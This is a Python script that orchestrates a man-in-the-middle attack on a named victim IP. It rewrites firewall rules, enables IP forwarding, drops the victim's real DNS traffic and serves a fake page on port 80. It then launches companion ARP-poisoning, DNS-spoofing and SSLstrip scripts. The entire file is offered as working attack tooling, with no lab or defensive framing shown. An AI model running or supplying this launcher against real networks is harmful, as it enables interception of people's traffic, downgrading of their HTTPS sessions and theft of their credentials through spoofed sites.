import subprocess
import argparse
import os
import signal
import sys
import time

FAKE_PAGE_PATH = "index.html"


# --- Fake Page setup ---
def start_fake_server():
    print("+++ Starting fake web server on port 80...")
    cmd = ["python", "-m", "SimpleHTTPServer", "80"]
    return subprocess.Popen(cmd, stdout=open(os.devnull, 'wb'), stderr=subprocess.STDOUT)


# --- Utility Functions ---
def setup_attack_env(victim_ip, gateway_ip):
    # flushing all previous firewall rules
    os.system("iptables -F")
    os.system("iptables -t nat -F")

    print("+ Setting up attack firewall...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Blocking real DNS queries from victim to gateway
    os.system("iptables -I FORWARD 1 -s {} -d {} -p udp --dport 53 -j DROP".format(victim_ip, gateway_ip))
    os.system("iptables -I FORWARD -p udp --dport 53 -j DROP")
    # Allowing HTTP traffic to our fake web server
    os.system("iptables -I INPUT 1 -p tcp --dport 80 -s {} -j ACCEPT".format(victim_ip))


def cleanup():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    print("---> All cleaned. Exiting.")


# --- Main Logic ---
def main():
    parser = argparse.ArgumentParser(description="Combined ARP + DNS + SSLstrip MITM Launcher")
    parser.add_argument("--iface", required=True, help="Network interface (e.g. eth0)")
    parser.add_argument("--victim", required=True, help="Victim IP")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--arp-mode", choices=["silent", "aggressive", "custom"], default="custom")
    parser.add_argument("--arp-sleep", type=float, default=2.0)
    parser.add_argument("--target-domains", nargs="+", required=True, help="Domains to spoof")
    parser.add_argument("--spoof-ip", required=True, help="Fake IP to send in DNS replies")
    parser.add_argument("--dns-mode", choices=["silent", "aggressive"], default="silent")
    parser.add_argument("--log", help="Optional log file for sslstrip")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("! You must run this script as root.")
        sys.exit(1)

    # Setup environment
    setup_attack_env(args.victim, args.gateway)

    # Define processes to be launched
    processes = []
    try:
        processes.append(start_fake_server())
        time.sleep(1)
        # === Start ARP Spoofing ===
        print("* Launching ARP spoofing...")
        arp_cmd = [
            "python", "arp_poisoning.py",
            "--victims", args.victim,
            "--gateway", args.gateway,
            "--iface", args.iface,
            "--mode", args.arp_mode,
            "--sleep", str(args.arp_sleep)
        ]
        processes.append(subprocess.Popen(arp_cmd))

        # === Start DNS Spoofing ===
        print("* Launching DNS spoofing...")
        dns_cmd = [
                      "python", "dns_spoofing.py",  # Use python 2.7
                      "--iface", args.iface,
                      "--target-domains",
                  ] + args.target_domains + [
                      "--spoof-ip", args.spoof_ip,
                      "--mode", args.dns_mode
                  ]
        processes.append(subprocess.Popen(dns_cmd))

        # === Start SSLstrip ===
        print("* Launching SSLstrip...")
        ssl_cmd = ["python", "ssl_strip.py"]
        if args.log:
            ssl_cmd.extend(["--log", args.log])
        processes.append(subprocess.Popen(ssl_cmd))

        print("\n* All components running (press Ctrl+C to stop)")

        # while True:
        # time.sleep(1)
        # Waits for user interrupt
        signal.pause()


    except KeyboardInterrupt:
        print("\n! Caught interrupt. Stopping all components...")
    finally:
        for p in processes:
            p.terminate()
        cleanup()
        sys.exit(0)


if __name__ == "__main__":
    main()